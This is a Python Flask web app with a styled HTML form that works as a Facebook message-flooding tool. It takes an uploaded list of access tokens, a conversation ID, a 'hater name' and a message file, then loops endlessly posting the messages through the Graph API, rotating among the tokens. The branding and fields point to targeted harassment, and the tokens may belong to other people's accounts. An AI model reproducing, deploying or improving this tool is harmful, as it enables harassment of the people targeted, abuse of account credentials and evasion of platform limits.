from flask import Flask, request
import requests
import os
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_tokens_file = request.files['accessToken']
        access_tokens = access_tokens_file.readlines()
        num_tokens = len(access_tokens)
        convo_id = request.form.get('threadId')
        haters_name = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        num_messages = len(messages)
        max_tokens = min(num_tokens, num_messages)

        try:
            while True:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = access_tokens[token_index].decode().strip()
                    message = haters_name + ' ' + messages[message_index].strip()

                    api_url = f'https://graph.facebook.com/v15.0/t_{convo_id}/'
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, json=parameters, headers=headers)

                    if response.status_code == 200:
                        print("✅ SENT BY TOKEN {}: {}".format(token_index+1, {message}))
                    else:
                        print(f"❌ Failed  {message}")

                    time.sleep(time_interval)

        except Exception as e:
            print(f"⚠️ Error while sending message: {e}")
            time.sleep(30)

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RUDRA😈DADDY💀KA W3B</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
    body {
        background: url('https://i.ibb.co/0sr1mVJ/7b7cbc0b-0094-4f2d-959e-d221ea8c1796.jpg') no-repeat center center fixed;
        background-size: cover;
        color: #fff;
        font-family: 'Courier New', Courier, monospace;
        overflow-x: hidden;
    }
    body::before {
        content: "";
        position: fixed;
        top:0; left:0; width:100%; height:100%;
        background: rgba(0,0,0,0.6);
        backdrop-filter: blur(8px);
        z-index: -1;
    }
    .header {
        text-align:center;
        padding:30px 10px;
        font-size:1.8em;
        letter-spacing:2px;
        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
    }
    .container {
        max-width:600px;
        background: rgba(0,0,0,0.7);
        padding:20px;
        margin: 50px auto;
        border-radius:20px;
        box-shadow: 0 0 20px #ff0000;
        opacity:0;
        transform: translateY(100px);
        transition: all 1s ease;
    }
    .container.show {opacity:1; transform:translateY(0);}
    label {font-weight:bold; font-size:1em;}
    input, select, textarea {background: rgba(255,255,255,0.1); color:#fff; border:none; border-radius:10px;}
    input:focus, textarea:focus {outline:none; box-shadow:0 0 10px #ff0000;}
    .btn-submit {width:100%; font-weight:bold; background:#ff0000; border:none; box-shadow:0 0 10px #ff0000; transition:0.3s;}
    .btn-submit:hover {background:#ff4d4d; box-shadow:0 0 20px #ff4d4d;}
    .footer {text-align:center; margin-top:20px; font-size:1em; color:#ffcccc; text-shadow:0 0 5px #ff0000;}
    a {color:#ff8080; text-decoration:none;}
    a:hover {text-decoration:underline; color:#ff4d4d;}
</style>
</head>
<body>
<div class="header">
    🔥𝗥𝗨𝗗𝗥𝗔 ⒷⓎ 🆁︎🆄︎🅳︎🆁︎🅰︎ 🅹︎🅰︎🅰︎🆃︎🔥<br>
    🅾🆆🅽🅴🆁]|^>>>• 🅁🆄🄳🅁🄰 🄹🄰🄰🅃
</div>

<div class="container" id="mainContainer">
<form action="/" method="post" enctype="multipart/form-data">
    <div class="mb-3">
        <label for="accessToken">📝 Attach Token File:</label>
        <input type="file" class="form-control" id="accessToken" name="accessToken" accept=".txt" required>
    </div>
    <div class="mb-3">
        <label for="threadId">💬 Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
    </div>
    <div class="mb-3">
        <label for="kidx">👤 Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
    </div>
    <div class="mb-3">
        <label for="txtFile">📄 Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
    </div>
    <div class="mb-3">
        <label for="time">⏱ Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
    </div>
    <button type="submit" class="btn btn-submit">🚀 Submit Details</button>
</form>
</div>

<div class="footer">
    😈🅁🆄🄳🅁🄰 🄹🄰🄰🅃➖🔥❤️➖❥<br>
    Keep enjoying
</div>

<script>
window.onload = function(){document.getElementById('mainContainer').classList.add('show');}
</script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
